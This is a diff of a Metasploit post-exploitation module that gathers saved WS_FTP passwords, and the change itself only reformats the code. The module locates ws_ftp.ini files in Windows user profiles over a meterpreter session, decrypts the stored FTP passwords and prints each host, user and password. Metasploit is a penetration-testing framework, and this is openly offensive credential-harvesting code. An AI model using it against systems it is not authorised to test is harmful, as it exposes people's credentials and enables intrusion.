@@ -3,30 +3,33 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
   include Msf::Post::Windows::UserProfiles
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Windows Gather WS_FTP Saved Password Extraction',
-        'Description'   => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather WS_FTP Saved Password Extraction',
+        'Description' => %q{
           This module extracts weakly encrypted saved FTP Passwords
           from WS_FTP. It finds saved FTP connections in the ws_ftp.ini file.
         },
-        'License'       => MSF_LICENSE,
-        'Author'        => [ 'theLightCosine'],
-        'Platform'      => [ 'win' ],
-        'SessionTypes'  => [ 'meterpreter' ]
-      ))
+        'License' => MSF_LICENSE,
+        'Author' => [ 'theLightCosine'],
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ]
+      )
+    )
   end
 
   def run
     print_status("Checking Default Locations...")
     grab_user_profiles().each do |user|
       next if user['AppData'] == nil
+
       check_appdata(user['AppData'] + "\\Ipswitch\\WS_FTP\\Sites\\ws_ftp.ini")
       check_appdata(user['AppData'] + "\\Ipswitch\\WS_FTP Home\\Sites\\ws_ftp.ini")
     end
@@ -49,16 +52,18 @@ class MetasploitModule < Msf::Post
 
     ini.each_key do |group|
       next if group == "_config_"
+
       print_status("Processing Saved Session #{group}")
       host = ini[group]['HOST']
       host = host.delete "\""
       username = ini[group]['UID']
       username = username.delete "\""
-      port = 	ini[group]['PORT']
+      port =	ini[group]['PORT']
       passwd = ini[group]['PWD']
       passwd = decrypt(passwd)
 
       next if passwd == nil or passwd == ""
+
       port = 21 if port == nil
       print_good("Host: #{host} Port: #{port} User: #{username}  Password: #{passwd}")
       service_data = {
